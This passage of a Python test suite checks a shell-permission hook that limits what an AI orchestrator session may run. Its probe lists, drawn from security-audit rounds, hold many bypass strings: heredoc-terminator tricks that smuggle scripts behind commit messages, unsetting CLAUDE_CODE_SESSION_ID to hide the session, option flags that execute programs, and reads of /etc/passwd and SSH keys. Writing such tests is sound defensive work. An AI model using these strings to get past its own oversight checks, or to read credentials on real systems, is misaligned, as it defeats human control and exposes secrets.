    'git log -1 "$(./run-plans.sh --self y)"',
    'git log -1 $(./run-plans.sh --self y)',
    'git log -1 --format="$(cat <<EOF\\n$(./run-plans.sh --self x)\\nEOF\\n)"',
    'git push "ext::env -u CLAUDE_CODE_SESSION_ID ./run-plans.sh --self x" main',
    "git push 'ext::./run-plans.sh --self x' HEAD",
    'git push --exec=./run-plans.sh /tmp/r main',
    "git push --rec='./run-plans.sh --self x' /tmp/r main",
    'git push --receive-pack=./run-plans.sh /tmp/r main',
    'git push --receive=./run-plans.sh /tmp/r main',
    'git rebase -x ./run-pl*.sh HEAD',
    'git status "$(./run-plans.sh)"',
    'git submodule foreach ./run-plan?.sh',
    'if ./run-plan?.sh; then :; fi',
    'ls "$(./run-plans.sh --self x)"',
    'ls 2>&1 >/dev/null | ./run-plan?.sh',
    'ls __heredoc_argument_0__ ; bash run-plans.sh',
    'ls | ./run-plan?.sh',
    'ls |& ./run-plan?.sh',
    'mypy analysis',
    'nohup ./run-plan?.sh',
    'npx playwright test',
    'perl -e \'system("./run-pl*.sh x")\'',
    'php -r \'system("./run-plan?.sh");\'',
    'pytest -q "$(cat <<\'EOF\'\\nself/tests\\nEOF\\n)"',
    'pytest -q 2>&1 | tail',
    'pytest -q | tail -5',
    'python3 -B -m pytest -q',
    'python3 -c "import os;os.system(\'./run-pl*.sh x\')"',
    'python3 -m mypy analysis',
    'python3 -m ruff check .',
    'python3 analysis/manifest.py --self x get base',
    'rsync -e ./run-plan?.sh a b:',
    'ruff check .',
    "sed -n '1e ./run-plans.sh' README.md",
    "sed -n 1p --expression='1e ./run-plans.sh' README.md",
    'select x in 1; do ./run-plan?.sh; done',
    'self/gate.sh',
    'sh -c "./run-plan?.sh x"',
    'sh -n +n run-plans.sh',
    'shellcheck -x run-plans.sh',
    'ssh localhost ./run-plan?.sh',
    'tar -cf /dev/null --to-command=./run-plan?.sh x',
    'then ./run-plans.sh',
    'time -p ./run-plan?.sh',
    'time ./run-plan?.sh',
    "timeout 5 bash -c 'exec ./run-plan?.sh x'",
    'timeout 60 pytest -q',
    'tmux new ./run-plan?.sh',
    "trap './run-plans.sh x' EXIT",
    'trap ./run-plan?.sh EXIT',
    'true __heredoc_argument_7__ && ./run-plans.sh --self x',
    'true __heredoc_argument_7__ && env -u CLAUDE_CODE_SESSION_ID ./run-plans.sh --self x',
    'uv run pytest',
    "vim -c '!./run-pl*.sh'",
    'while ./run-plan?.sh; do :; done',
    '{ ./run-plan?.sh; }',
    '~+/run-plan?.sh',
    '~+/run-plans.sh',
    '~/agentTooling/run-plan?.sh',
]
# The allowlist's own denial names the shapes it admits
ALLOWLIST_MARK = "an orchestrator session runs only"
SANCTIONED = [
    "git commit -m \"$(cat <<'EOF'\nrecord wave\n\nimplementers run feature-start.sh themselves\n\nCo-Authored-By: x\nEOF\n)\"",
    "git commit -m \"$(cat <<\"EOF\"\nrecord wave\nEOF\n)\"",
    "git commit -m \"record: implementers run feature-start.sh themselves\"",
    "git push -u origin \"$(git branch --show-current)\"",
    "git push -u origin HEAD",
    "gh pr create --title records --body \"$(cat <<'EOF'\nrecords only; run-plans.sh is not run here\nEOF\n)\"",
    "gh pr create --title records --body \"orchestration record only\"",
    "git log --oneline -- run-plans.sh", "git diff HEAD -- feature-close.sh",
    "git show HEAD:run-plans.sh", "sed -n 1,5p run-plans.sh", "find . -name '*.sh'",
    "rg feature-start.sh", "git status --short && git log --oneline -3 | head -2",
    "git fetch origin main", "git add {rel}self/orchestrations/wave/README.md",
    "gh pr view 12", "cat README.md 2>&1 | wc -l",
]
# Round 1's sanctioned list held these too; the allowlist does not admit them, by design: a
# glob, `$VAR`, a `for` loop, `bash -n`, `find -exec` and `git grep` (not among git's allowed
# read subcommands) are each work for a subagent. Denied with the allowlist's reason.
DROPPED_FROM_SANCTIONED = [
    "git grep -n feature-start.sh", "bash -n run-plans.sh",
    "find self/orchestrations -name README.md -exec grep -l session {} \\;",
    "echo $HOME", "jq -r .session self/orchestrations/*/report.json", "ls *.sh",
    "wc -l *.sh", "for f in self/orchestrations/*/README.md; do head -3 \"$f\"; done",
]
# H18: what the two allowed expansions must not become
EXPANSION_ABUSE = [
    "git commit -m \"$(cat <<EOF\nmsg\nEOF\n)\"",
    "git commit -m \"$(cat <<'EOF'\nmsg\nEOF\n./run-plans.sh --self x)\"",
    "git commit -m \"$(cat <<'EOF'\nmsg\nEOF\n$(id)\nEOF\n)\"",
    "git commit -m \"$(cat <<'EOF'\nmsg\nEOF\n)\" && ./run-plans.sh x",
    "git log \"$(git branch --show-current)\"",
    "cat \"$(cat <<'EOF'\nREADME.md\nEOF\n)\"",
    "git push -u origin $(git branch --show-current)",
    "git commit -m \"$(git branch --show-current)\"",
]
RUNNERS = ["pytest zz_test.py -q", "python3 -m pytest zz_test.py", "npm run test", "npm test",
           "./self/gate.sh", "./check-plans.sh --self x"]
for fixture, (root, hook, record, prefix, rel) in FIXTURES.items():
    for profile in PROFILES:
        tag = "%s/%s" % (fixture, profile)
        for command in ANSI_AND_FRIENDS:
            decision, reason = bash(fixture, profile, command, SESSION_S)
            check("H14 [%s] %r from the orchestrator is denied with the role reason" % (tag, command),
                  decision == DENY and role_reason(reason, record), "%s: %s" % (decision, reason))
        for command in SANCTIONED:
            command = command.replace("{rel}", rel)
            decision, reason = bash(fixture, profile, command, SESSION_S)
            check("H15 [%s] %r from the orchestrator is on the allowlist (not the role denial)" % (tag, command),
                  decision != ERR and ROLE_MARK not in reason and ALLOWLIST_MARK not in reason,
                  "%s: %s" % (decision, reason))
        for command in DROPPED_FROM_SANCTIONED + EXPANSION_ABUSE:
            decision, reason = bash(fixture, profile, command, SESSION_S)
            check("H18 [%s] %r from the orchestrator is the allowlist denial" % (tag, command),
                  decision == DENY and role_reason(reason, record) and ALLOWLIST_MARK in reason,
                  "%s: %s" % (decision, reason))
        for line in ROUND2_PROBES:
            command = line.replace("\\n", "\n")
            decision, reason = bash(fixture, profile, command, SESSION_S)
            check("H19 [%s] round 2 probe %r from the orchestrator is denied with the role reason" % (tag, line),
                  decision == DENY and role_reason(reason, record), "%s: %s" % (decision, reason))
        for command in RUNNERS:
            decision, reason = bash(fixture, profile, command, SESSION_S)
            check("H16 [%s] %r from the orchestrator is never allow" % (tag, command),
                  decision in (SILENT, ASK, DENY), "%s: %s" % (decision, reason))
            other, _ = bash(fixture, profile, command, SESSION_T)
            check("H16 [%s] %r from another session is not the role denial" % (tag, command),
                  other != ERR and ROLE_MARK not in _, other)

# H26 (self/features/hook-audit-gaps/, B1): bash ends a heredoc only at a line holding exactly
# the delimiter, so `EOF)` is body text and everything after it up to a later bare `EOF` line
# is code bash RUNS (probed on bash 5.2: SMUGGLED is printed). The audit's exploit, with real
# line breaks, from S must be the role denial — a build script smuggled behind a commit
# message or a PR body — and the honest commit and PR bodies stay on the allowlist.
B1_SMUGGLE_TAIL = " ; %sfeature-start.sh zz ; echo \"\nEOF\n)\""
B1_COMMAND_HEADS = [
    "git commit -m \"$(cat <<'EOF'\nx\nEOF)\"",
    "gh pr create --title t --body \"$(cat <<'EOF'\nx\nEOF)\"",
    # round 2 (escalations/01-audit-opus.md, E1): bash 5.2 ends the heredoc at ANY body line
    # that begins with the delimiter and goes on to the `)` — a blank, a tab, a word character
    # or a quote between them hid the build script from round 1's reader (probed: bash ran it)
    "git commit -m \"$(cat <<'EOF'\nx\nEOF )\"",
    "git commit -m \"$(cat <<'EOF'\nx\nEOF\t)\"",
    "git commit -m \"$(cat <<'EOF'\nx\nEOFS)\"",
    "git commit -m \"$(cat <<'EOF'\nx\nEOF x)\"",
    "git commit -m \"$(cat <<'EOF'\nx\nEOF a b c)\"",
    "git commit -m \"$(cat <<'EOF'\nx\nEOFxyz ; true)\"",
    "git commit -m \"$(cat <<'EOF'\nx\nEOF'q')\"",
    "gh pr create --title t --body \"$(cat <<'EOF'\nx\nEOF )\"",
    # round 3 (escalations/02-audit-opus.md, R2-1 and R2-2): a terminator bash joins across a
    # line continuation (an unquoted delimiter), and a `$(` split by one — bash ran the build
    # script behind each; held before the round, pinned by it
    "git commit -m \"$(cat <<EOF\nx\nEO\\\nF\n)\"",
    "git commit -m \"$\\\n(cat <<'EOF'\nx\nEOF)\"",
    "git commit -m \"$(cat <\\\n<'EOF'\nx\nEOF )\"",
]
# ... and the audit's o4: a quoted delimiter joins nothing, so `EO\⏎F)` is two body lines, the
# heredoc ends at the last `EOF` and bash runs the commit alone — still the message it is
B1_QUOTED_JOIN = "git commit -m \"$(cat <<'EOF'\nx\nEO\\\nF)\" ; %sfeature-start.sh zz ; echo \"\nEOF\n)\""
for fixture, (root, hook, record, prefix, rel) in FIXTURES.items():
    for profile in PROFILES:
        tag = "%s/%s" % (fixture, profile)
        for head in B1_COMMAND_HEADS:
            command = head + B1_SMUGGLE_TAIL % prefix
            decision, reason = bash(fixture, profile, command, SESSION_S)
            check("H26 [%s] B1 exploit %r from the orchestrator is denied with the role reason"
                  % (tag, command), decision == DENY and role_reason(reason, record),
                  "%s: %s" % (decision, reason))
            decision, reason = bash(fixture, profile, command, SESSION_T)
            check("H26 [%s] B1 exploit %r from another session is not the role denial"
                  % (tag, command), decision != ERR and ROLE_MARK not in reason,
                  "%s: %s" % (decision, reason))
        decision, reason = bash(fixture, profile, B1_QUOTED_JOIN % prefix, SESSION_S)
        check("H26 [%s] a quoted delimiter's `EO\\⏎F)` is body text: the orchestrator's commit "
              "is not denied" % tag, decision not in (DENY, ERR), "%s: %s" % (decision, reason))

# H17 (security audit round 2): N1 — `bash -n +n f` and `bash -n +o noexec f` run f, so they
# are never `allow` for anyone and are the role denial from S; N4 — a command spelling the
# heredoc placeholder itself neither crashes the judge into silence nor slips past it.
UNDO_NOEXEC = ["bash -n +n %srun-plans.sh", "bash -n +o noexec %srun-plans.sh", "sh -n +n %srun-plans.sh"]
PLACEHOLDER_SPELLED = [
    "true __heredoc_argument_7__ && env -u CLAUDE_CODE_SESSION_ID %srun-plans.sh --self x",
    "echo __heredoc_argument_0__; %srun-plans.sh --self x",
    "git commit -m __heredoc_argument_0__ && %srun-plans.sh --self x",
]
for fixture, (root, hook, record, prefix, rel) in FIXTURES.items():
    for profile in PROFILES:
        tag = "%s/%s" % (fixture, profile)
        for form in UNDO_NOEXEC + PLACEHOLDER_SPELLED:
            command = form % (rel if form in UNDO_NOEXEC else prefix)
            decision, reason = bash(fixture, profile, command, SESSION_S)
            check("H17 [%s] %r from the orchestrator is denied with the role reason" % (tag, command),
                  decision == DENY and role_reason(reason, record), "%s: %s" % (decision, reason))
        for form in UNDO_NOEXEC:
            command = form % rel
            decision, reason = bash(fixture, profile, command, SESSION_T)
            check("H17 [%s] %r from another session is never allow" % (tag, command),
                  decision in (SILENT, ASK, DENY), "%s: %s" % (decision, reason))
        decision, _ = bash(fixture, profile, "bash -n %srun-plans.sh" % rel, SESSION_T)
        check("H17 [%s] plain `bash -n` over a script is still approved for another session" % tag,
              decision == ALLOW, decision)

# H13: the ledger in the git dir (orchestration-start.sh appends to it) holds the role when
# no record names the session any more — a record rewritten in place, or deleted.
SESSION_L = "1e1e1e1e-0000-0000-0000-000000000009"
LEDGER_SLUG = "gone"
for fixture, (root, hook, record, prefix, rel) in FIXTURES.items():
    ledger = os.path.join(root, ".git", "agenttooling-orchestrators")
    with open(ledger, "a") as f:
        f.write("%s %s\n" % (SESSION_L, LEDGER_SLUG))
    for profile in PROFILES:
        tag = "%s/%s" % (fixture, profile)
        decision, reason = bash(fixture, profile, "%sfeature-start.sh x --method m" % prefix, SESSION_L)
        check("H13 [%s] a session only the ledger names is denied feature-start.sh, naming its slug" % tag,
              decision == DENY and ROLE_MARK in reason and LEDGER_SLUG in reason, "%s: %s" % (decision, reason))
        decision, reason = agent(fixture, profile, {"prompt": MARKER_PROMPT}, SESSION_L)
        check("H13 [%s] ... and an implementer brief" % tag,
              decision == DENY and ROLE_MARK in reason, "%s: %s" % (decision, reason))
        decision, reason = bash(fixture, profile, "%sfeature-start.sh x --method m" % prefix, SESSION_T)
        check("H13 [%s] a session the ledger does not name is not the role denial" % tag,
              decision != ERR and ROLE_MARK not in reason, "%s: %s" % (decision, reason))
    os.remove(ledger)

# H20 (round 3): for a session that is no orchestrator the allowlist changes nothing. Security
# audit round 2's regression set (c6) is run through this hook and through origin/main's
# (extracted beside it with git archive), and every answer must be byte-identical. Skipped,
# saying so, where this checkout has no origin/main to compare with.
REGRESSION_SET = [
    'ls',
    'ls -la hooks',
    'cat README.md',
    'head -20 run-plans.sh',
    'tail -5 hooks/README.md',
    'wc -l *.sh',
    'grep -rn orchestrator hooks',
    'rg -n BUILD_SCRIPTS hooks',
    "find . -name '*.py' -newer README.md",
    "find . -name '*.sh' -exec grep -l refuse {} ;",
    'sed -n 1,20p feature-close.sh',
    'stat README.md',
    'du -sh self',
    'git status',
    'git status --short',
    'git log --oneline -5',
    'git log -p -1 -- run-plans.sh',
    'git diff',
    'git diff HEAD~1 --stat',
    'git diff origin/main...HEAD',
    'git show HEAD:README.md',
    'git show --stat HEAD',
    'git branch --show-current',
    'git worktree list',
    'git stash list',
    'git -C hooks status',
    'git add -A',
    'git add hooks/README.md',
    'git commit -m "fix: x"',
    'git commit -m "$(cat <<\'EOF\'\\nfix: x\\n\\nCo-Authored-By: y\\nEOF\\n)"',
    'git commit --amend --no-edit',
    'git push',
    'git push -u origin HEAD',
    'git push -u origin "$(git branch --show-current)"',
    'git push --force',
    'git fetch origin',
    'git pull',
    'git checkout -b x',
    'git checkout main',
    'git reset --hard HEAD~1',
    'git stash',
    'git rebase main',
    'git merge main',
    'git clean -fd',
    'git grep -n refuse',
    'git blame README.md',
    'git rev-parse HEAD',
    'git remote -v',
    'git tag v1',
    'git config user.name',
    'git config core.hooksPath x',
    'gh pr create --title t --body b',
    'gh pr create --title t --body "$(cat <<\'EOF\'\\nbody\\nEOF\\n)"',
    'gh pr view 1',
    'gh pr list',
    'gh api repos/o/r',
    'gh issue list',
    'pytest -q',
    'pytest self/tests -k x',
    'python3 -m pytest -q',
    'ruff check .',
    'ruff format --check .',
    'mypy analysis',
    'npm run test',
    'npm run build',
    'npm install',
    'npx playwright test',
    './self/gate.sh',
    './check-plans.sh --self',
    'bash -n run-plans.sh',
    'shellcheck run-plans.sh',
    'python3 -m py_compile hooks/policy.py',
    'python3 analysis/report.py --self x',
    'python3 analysis/manifest.py --self x get base',
    'python3 analysis/manifest.py --self x set-plans a',
    'python3 analysis/capture_planning.py --self x --list',
    './run-plans.sh --self x',
    './run-verify.sh --self x',
    './run-review.sh --self x',
    './run-batch.sh --self x',
    './feature-start.sh --self x',
    './feature-close.sh --self x',
    'bash run-plans.sh --self x',
    'env ./run-plans.sh',
    './orchestration-start.sh x',
    './stamp-timing.sh x',
    'cd hooks && ls',
    'cd /tmp',
    'cd hooks',
    'X=1; echo $X',
    'echo $HOME',
    'ls ~/x',
    'cat ../x',
    'python3 -c "print(1)"',
    'bash -c "ls"',
    'node -e "1"',
    "python3 - <<'EOF'\\nprint(1)\\nEOF",
    "cat <<'EOF'\\nhello\\nEOF",
    'echo x > f',
    "cat > f <<'EOF'\\nx\\nEOF",
    'sed -i s/a/b/ f',
    'for f in *; do echo $f; done',
    'sleep 5',
    'ls && sleep 1',
    'grep x f && git commit -m m',
    'rm -rf self',
    'mkdir x',
    'cp a b',
    'mv a b',
    'touch x',
    'chmod +x x',
    'curl https://example.com',
    'make',
    'docker ps',
    'echo hello',
    'echo "a b"',
    'date',
    'pwd',
    'true',
    'jq . x.json',
    'ls | head',
    'cat README.md | grep x',
    'ls; ls',
    'ls $(pwd)',
    'ls "$(pwd)"',
    "cat 'x",
    'ls {a,b}',
    'cat {a,{b,c}}',
    'ls *.sh',
    './x.sh',
    'env FOO=1 ls',
    'xargs ls',
    'find . -delete',
]
BASELINE_REF = "origin/main"
baseline_ok = subprocess.run(["git", "-C", AT, "rev-parse", "-q", "--verify", BASELINE_REF],
                             capture_output=True).returncode == 0
if baseline_ok:
    BASE_ROOT = os.path.join(TMP, "baseline")
    shutil.copytree(SELF, BASE_ROOT, symlinks=True)
    shutil.rmtree(os.path.join(BASE_ROOT, "hooks"))
    archive = subprocess.run(["git", "-C", AT, "archive", BASELINE_REF, "hooks"], capture_output=True)
    subprocess.run(["tar", "-x", "-C", BASE_ROOT], input=archive.stdout, check=True)
    base_hook = os.path.join(BASE_ROOT, "hooks", HOOK_NAME)
    for profile in PROFILES:
        same = True
        for line in REGRESSION_SET:
            command = line.replace("\\n", "\n")
            outs = []
            for root, hook in ((SELF, HOOK_S), (BASE_ROOT, base_hook)):
                payload = {"tool_name": "Bash", "cwd": root, "session_id": SESSION_T,
                           "tool_input": {"command": command}}
                out = run_hook(hook, root, json.dumps(payload), profile).stdout
                outs.append(out.replace(root, "<root>"))
            if outs[0] != outs[1]:
                same = False
                check("H20 [%s] %r answers as origin/main's hook does" % (profile, line), False,
                      "new: %s | main: %s" % (outs[0][:200], outs[1][:200]))
        check("H20 [%s] the %d-command regression set answers byte-identically to %s's hook for a non-orchestrator"
              % (profile, len(REGRESSION_SET), BASELINE_REF), same)
else:
    print("  skip  H20: no %s in this checkout to compare with" % BASELINE_REF)

# H21 (security audit round 3, R1–R8): every row of the auditor's a1–a4/a6 probe files, sent
# from S in agentTooling's own shape. ROUND3_ADMITTED holds the rows the allowlist admits —
# legitimate shapes, judged after it like any command — and each must not be the allowlist
# or role denial; every other row must be denied. `\\n` in a row stands for a newline.
ROUND3_ROWS = [
    'ls',
    'git status',
    './run-plans.sh --self x',
    'bash -n +n run-plans.sh',
    'git commit -m "$(cat <<\'EOF\'\\nfix: x\\nEOF\\n)"',
    'git push -u origin "$(git branch --show-current)"',
    'echo \'a "$(cat <<\'EOF\'\\n\'; ./run-plans.sh --self x; echo \'\\nEOF\\n)" b\'',
    'echo \'a "$(cat <<\'EOF\'\\n\'; touch pwned; echo \'\\nEOF\\n)" b\'',
    'echo \'a "$(cat <<\'E\'\\n\' && env -u CLAUDE_CODE_SESSION_ID ./run-plans.sh --self x && echo \'\\nE\\n)" b\'',
    'echo \'a "$(cat <<\'E\'\\n\' | bash run-plans.sh | echo \'\\nE\\n)" b\'',
    'git commit -m \'a "$(cat <<\'EOF\'\\n\' --amend --no-verify -m \'\\nEOF\\n)" b\'',
    'echo \'a "$(cat <<"E"\\n\'; touch pwned; echo \'\\nE\\n)" b\'',
    'echo "a"$(cat <<\'EOF\'\\n-n x\\nEOF\\n)"b"',
    'git commit -m ""$(cat <<\'EOF\'\\nmsg --amend --no-verify --allow-empty\\nEOF\\n)""',
    'git commit -m "x"$(cat <<\'EOF\'\\n -a --no-verify\\nEOF\\n)""',
    'gh pr create --title t --body ""$(cat <<\'EOF\'\\nb --web --repo o/r --body-file /etc/passwd\\nEOF\\n)""',
    'gh pr create --title t --body "$(cat <<\'EOF\'\\nb\\nEOF\\n)"',
    'gh pr create --title "$(cat <<\'EOF\'\\nb\\nEOF\\n)" --body "$(cat <<\'EOF\'\\nb\\nEOF\\n)"',
    'git commit -m "$(cat <<EOF\\n$(touch pwned)\\nEOF\\n)"',
    'git commit -m "$(cat <<\'EOF\'\\nmsg\\nEOF\\ntouch pwned)"',
    'git commit -m "$(cat <<\'EOF\'\\nmsg\\nEOF)"',
    'git commit -m "$(cat <<\'EOF\'\\nmsg\\nEOF\\n)" ; touch pwned',
    'git commit -m "$(cat <<\'EOF\'\\nmsg\\nEOF\\n)"; ./run-plans.sh x',
    'git commit -m "$(cat <<-\'EOF\'\\n\\tmsg\\n\\tEOF\\n)"',
    'git commit -m "$(cat <<\'EOF\'\\r\\nmsg\\r\\nEOF\\r\\n)"',
    'git commit -m "$(cat <<\'EOF"\\nmsg\\nEOF\\n)"',
    'git commit -m "$(cat <<"EOF"\\nmsg $(touch pwned)\\nEOF\\n)"',
    'git commit -m "$(cat <<\'EOF\'\\nmsg\\nEOF \\n$(touch pwned)\\nEOF\\n)"',
    'git commit -m "$(cat <<\'EOF\'\\nmsg\\nEOF\\n$(touch pwned)\\nEOF\\n)"',
    'git commit -m "$(cat <<\'EOF\'\\nmsg\\n EOF\\n$(touch pwned)\\nEOF\\n)"',
    'git commit -m "$(cat <<\'EOF\'\\na\\nEOF\\n)" -m "$(cat <<\'EOF\'\\nb\\nEOF\\n)"',
    'git commit -m "$(cat <<\'A\'\\na\\nA\\n)$(cat <<\'B\'\\nb\\nB\\n)"',
    'git commit -m "$(cat <<\'EOF\' \\nmsg\\nEOF\\n)"',
    'git commit -m "$(cat  <<\'EOF\'\\nmsg\\nEOF\\n)"',
    'git commit -m "$(cat <<\'EOF\'\\n$(cat <<\'X\'\\ntouch\\nX\\n)\\nEOF\\n)"',
    'git commit -m __orchestrator_0000000000000000_0__',
    'git commit -m __orchestrator_0000000000000000_branch__',
    'git push -u origin __orchestrator_0000000000000000_branch__',
    'git status "$(git branch --show-current)"',
    'ls "$(git branch --show-current)"',
    'git commit -m "$(git branch --show-current)"',
    'git push -u origin "$(git branch --show-current)":main',
    'git push -u origin "x"$(git branch --show-current)"y"',
    'git push -u origin "$(git branch  --show-current)"',
    'git push -u origin $(git branch --show-current)',
    'find . -name x -fprintf out.txt hi',
    'find . -fprint out',
    'find . -fprint0 out',
    'find . -fls out',
    'find . -newer README.md -delete',
    'find . -exec touch pwned ;',
    'find . -exec touch pwned +',
    "find . -execdir touch pwned ';'",
    "find . -ok touch pwned ';'",
    "find . -okdir touch pwned ';'",
    'find . -name x -printf hi',
    'find -files0-from /dev/stdin',
    'find . -D exec -name x',
    'find / -name x',
    'sed -n 1p README.md',
    'sed -n 1,5p README.md',
    "sed -n '1p;1e touch pwned' README.md",
    "sed -n '1w out' README.md",
    'sed -n 1p -i README.md',
    'sed -n 1p -f s.sed README.md',
    'sed -n 1p --expression=1e README.md',
    'sed -n 1p --in-place README.md',
    'sed -n -i 1p README.md',
    'sed -ni 1p README.md',
    'sed -n -e 1p README.md',
    "sed -n '1p\\n1w out' README.md",
    'sed -n 1p README.md -s',
    'sed -n 1p README.md --in-place',
    "sed -n '$p' README.md",
    "sed -n '/x/p' README.md",
    'sed -n 1p',
    'sed 1p README.md',
    'sed --quiet 1p README.md',
    'jq . x.json',
    'jq -n input x.json',
    "jq -n '$__loc__'",
    "jq -n --rawfile a /etc/passwd '$a'",
    'jq -n env',
    "jq -n '$ENV'",
    'jq -f prog.jq x.json',
    'jq --from-file prog.jq x.json',
    'jq -nf prog.jq',
    'jq -L . \'import "x" as x; .\' f.json',
    "jq --slurpfile a /etc/passwd -n '$a'",
    "jq --args -n '$ARGS' a b",
    'diff a b',
    'diff --to-file=a b',
    'diff -l a b',
    'diff --paginate a b',
    'diff -r a b',
    'sort a',
    'sort --files0-from=list',
    'sort -T /tmp a',
    'sort -o out a',
    'sort --output=out a',
    'sort --out=out a',
    'sort -uo out a',
    'sort a -o out',
    'sort --compress-program=./run-plans.sh -S 1k big',
    'sort --comp=sh a',
    'sort --co ./x a',
    'sort -S 1 a',
    'uniq a',
    'uniq a out',
    'uniq -c a out',
    'uniq -- a out',
    'uniq -- a -out',
    'uniq -- - -out',
    # review round 1, B1: the bare `-` is an operand, so `uniq - OUT` names two
    'uniq - out',
    'echo x | uniq - out',
    'uniq -c - out',
    'uniq --skip-fields=1 - out',
    'echo x | uniq -- - -out',
    "echo '#!/bin/sh' | uniq - -hook",
    'uniq -f 1 a',
    'tail -f README.md',
    'tail -F README.md',
    'tail --pid=1 -f README.md',
    'tail --follow README.md',
    'cat /proc/self/environ',
    'cat /proc/1/cmdline',
    'head -c 100 /dev/urandom',
    'cat /dev/zero',
    'cat fifo',
    'wc --files0-from=list',
    'du --files0-from=list',
    'date -f dates.txt',
    'date -s 2020-01-01',
    'date --set=2020-01-01',
    'date --se=2020-01-01',
    'date -us 2020-01-01',
    'date --file=x',
    'date 010100002020',
    'stat --printf=%n README.md',
    'stat -c %n README.md',
    'cut -f1 a',
    'tr a b',
    'pwd',
    'echo -e a',
    'printf %s a',
    'printf -v x a',
    'echo x | sed -n 1p',
    "printf 'e touch pwned' | sed -n 1p",
    "echo 'touch pwned' | cat",
    'echo x | tr a b | sort | uniq -c | head -3',
    'ls -la /root',
    'ls /etc',
    'cat /etc/passwd',
    'cat /root/.ssh/id_rsa',
    'grep -r secret /root',
    'grep -f pat a',
    'grep --include=x -r a .',
    'ls --hyperlink',
    'du -sh /',
    'rg x',
    'rg --pre cat x',
    'rg --pre=./run-plans.sh x',
    'rg --pre-glob x x',
    'rg --hostname-bin ./run-plans.sh x',
    'rg --hostname-bin=./run-plans.sh --hyperlink-format default x',
    'rg -z x',
    'rg -uz x',
    'rg --search-zip x',
    'rg --ignore-file .x x',
    "rg --type-add 'x:*.x' x",
    'rg --no-config x',
    'rg -f pats x',
    'rg --files',
    'rg --sort path x',
    'rg --engine pcre2 x',
    'tee out',
    'touch pwned',
    'bash run-plans.sh',
    'python3 -c 1',
    'env',
    'xargs ls',
    'awk 1',
    'sh',
    'cd hooks',
    'true',
    ':',
    'command ls',
    'builtin echo x',
    'exec ls',
    'time ls',
    '/bin/ls',
    './ls',
    '\\ls',
    "'ls'",
    '"ls"',
    "l's'",
    '"l"s',
    "''ls",
    'LS',
    'ls;;ls',
    'ls |& cat',
    'ls &',
    'ls && ls',
    'ls || ls',
    'ls ; ls',
    'ls ;',
    '; ls',
    'ls |',
    'ls # comment',
    'ls #comment',
    '#ls',
    'ls\\nls',
    "ls 'a\\nb'",
    'echo "a\\nb"',
    "ls 'a",
    'ls "a',
    'ls −la',
    'ls ‐la',
    'ls a b',
    'ls\t-la',
    'ls > /dev/null',
    'ls 2>&1',
    'ls > /dev/null 2>&1',
    'ls >/dev/null',
    'ls >\\n/dev/null',
    'ls > /dev/nullx',
    'ls > /dev/null/x',
    'ls >> /dev/null',
    'ls > out',
    'ls >out',
    'ls 2> /dev/null',
    'ls 2>/dev/null',
    'ls &> /dev/null',
    'ls >& /dev/null',
    'ls < /dev/null',
    'ls 1>&2',
    'ls 2>&1> out',
    'ls 2>&1>out',
    'ls x2>&1',
    'ls >/dev/null>out',
    'ls > /dev/null> out',
    'ls >\t/dev/null',
    "echo ' > /dev/null '",
    'X=1 ls',
    'X=1',
    'GIT_DIR=/x git status',
    'ls X=1',
    'ls $HOME',
    'ls ~',
    'ls ~root',
    'ls a~',
    'ls *',
    'ls a?',
    'ls [a]',
    'ls {a,b}',
    'ls a\\ b',
    'ls $(pwd)',
    'ls `pwd`',
    'ls <(pwd)',
    'ls "$HOME"',
    'ls "`pwd`"',
    'ls "a\\\\b"',
    "ls '$HOME'",
    'ls !x',
    '! ls',
    'ls a!b',
    'echo a=b',
    'echo "a;b"',
    "echo 'a|b'",
    'echo a(b',
    "echo $'a'",
    'echo $"a"',
    '(ls)',
    '{ ls; }',
    'ls \'a\' \'b\'"c"d',
    'if true; then ls; fi',
    'for i in a; do ls; done',
    'ls | while read x; do ls; done',
    'ls | xargs touch',
    'ls | sh',
    'ls | bash',
    'ls | python3',
    'echo ls | at now',
    "git log --format='%(trailers:key=x)' -1",
    'git log -p -1',
    'git log -p --ext-diff -1',
    'git log -p --ext -1',
    'git log --textconv -p',
    'git log --no-textconv -p',
    'git log --output=out -1',
    'git log --out=out -1',
    'git log --ou out',
    'git log --o=x',
    'git log -1 --output-indicator-new=x',
    'git diff',
    'git diff --no-index a b',
    'git diff --no-ext-diff',
    'git diff --output=out',
    'git diff -Oorder',
    'git diff -O order',
    'git diff -pO order',
    "git diff -- ':(top,exclude)hooks'",
    "git diff -- ':!hooks'",
    'git show HEAD:README.md',
    'git show --textconv HEAD:README.md',
    'git show --ext-diff',
    'git show --format=%B -s',
    'git status --porcelain',
    'git status -uall --ignored',
    'git rev-parse HEAD',
    'git rev-parse --show-toplevel',
    'git rev-parse --parseopt -- x',
    'git rev-parse --sq-quote a b',
    'git rev-parse --git-path hooks',
    'git ls-files',
    'git ls-files -o --exclude-standard',
    'git ls-files --exclude-per-directory=.gitignore',
    'git ls-files --with-tree=HEAD',
    'git log --exec=x',
    'git log -S x --pickaxe-regex',
    'git log -G x',
    'git log --all --source',
    'git log -L 1,2:README.md',
    'git log --since=yesterday',
    'git log --graph --oneline --decorate',
    'git log origin/main..HEAD',
    'git log --no-walk --do-walk',
    'git log --stdin',
    'git diff --stdin',
    'git log --remotes --glob=x',
    'git log --show-signature -1',
    'git show --show-signature',
    'git log -1 --format=%G?',
    'git status --show-stash',
    'git diff --submodule=diff',
    'git status --ignore-submodules=none',
    'git diff --relative=x',
    'git log --follow README.md',
    'git log -c -1',
    'git log --cc -1',
    'git log --run=x',
    'git show -O x',
    'git log --upload-pack=x',
    'git ls-files --recurse-submodules',
    'git log --no-pager',
    'git log --paginate',
    'git -p log',
    'git -c core.pager=x log',
    'git --no-pager log',
    'git -C hooks status',
    'git --git-dir=.git status',
    'git --exec-path=. status',
    'git --paginate status',
    'git branch',
    'git branch --show-current',
    'git branch --show-current x',
    'git branch -a',
    'git branch -D main',
    'git remote -v',
    'git remote',
    'git remote add x y',
    'git remote -v show',
    'git worktree list',
    'git worktree list --porcelain',
    'git worktree add x',
    'git stash list',
    'git grep x',
    'git blame README.md',
    'git cat-file -p HEAD',
    'git config -l',
    'git config core.hooksPath x',
    'git checkout main',
    'git switch main',
    'git reset --hard',
    'git clean -fdx',
    'git merge main',
    'git rebase main',
    'git pull',
    'git tag x',
    'git mv a b',
    'git rm a',
    'git restore a',
    'git apply x',
    'git am x',
    'git bisect run x',
    'git submodule foreach x',
    'git archive HEAD',
    'git bundle create x HEAD',
    'git daemon',
    'git difftool',
    'git mergetool',
    'git help -a',
    'git var GIT_EDITOR',
    'git for-each-ref',
    'git reflog',
    'git describe',
    'git shortlog',
    'git notes',
    'git update-index --fsmonitor',
